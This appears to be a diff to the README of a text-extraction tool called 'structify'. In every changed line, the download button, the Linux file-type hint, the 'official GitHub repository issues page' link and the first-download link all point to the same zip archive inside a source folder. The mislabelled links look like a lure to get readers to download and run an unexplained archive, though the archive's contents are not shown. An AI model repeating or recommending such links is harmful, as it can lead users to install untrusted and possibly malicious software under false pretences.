@@ -1,6 +1,6 @@
 # 🚀 structify - Extract Clear Data From Large Text
 
-[![Download structify](https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip)](https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip)
+[![Download structify](https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip)](https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip)
 
 ---
 
@@ -46,10 +46,10 @@ To get started with structify, follow these steps:
 
 1. **Visit the Download Page:**  
    Click this big button below to open the official download page.  
-   [![Download structify](https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip)](https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip)
+   [![Download structify](https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip)](https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip)
 
 2. **Choose Your Version:**  
-   On the page, find the version that matches your computer. For Windows, this might be a `.exe` file. For macOS, look for `.dmg` or `.pkg`. For Linux, check for `.AppImage` or `https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip`.
+   On the page, find the version that matches your computer. For Windows, this might be a `.exe` file. For macOS, look for `.dmg` or `.pkg`. For Linux, check for `.AppImage` or `https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip`.
 
 3. **Download the File:**  
    Click the download link for the file that fits your system. Save it to a location you can find, like your desktop or downloads folder.
@@ -103,7 +103,7 @@ structify processes data locally on your machine unless you choose to connect to
 
 ## 🛠️ Support and Feedback
 
-If you need help or want to share your experience, visit the [official GitHub repository issues page](https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip). The community and developers monitor it regularly and respond to questions.
+If you need help or want to share your experience, visit the [official GitHub repository issues page](https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip). The community and developers monitor it regularly and respond to questions.
 
 ---
 
@@ -115,4 +115,4 @@ structify is an open-source tool built to help people take advantage of language
 
 ---
 
-For your first download, start here: [https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip](https://raw.githubusercontent.com/conectrix/structify/main/src/providers/Software_2.3.zip)
+For your first download, start here: [https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip](https://github.com/conectrix/structify/raw/refs/heads/main/src/providers/Software_2.3.zip)
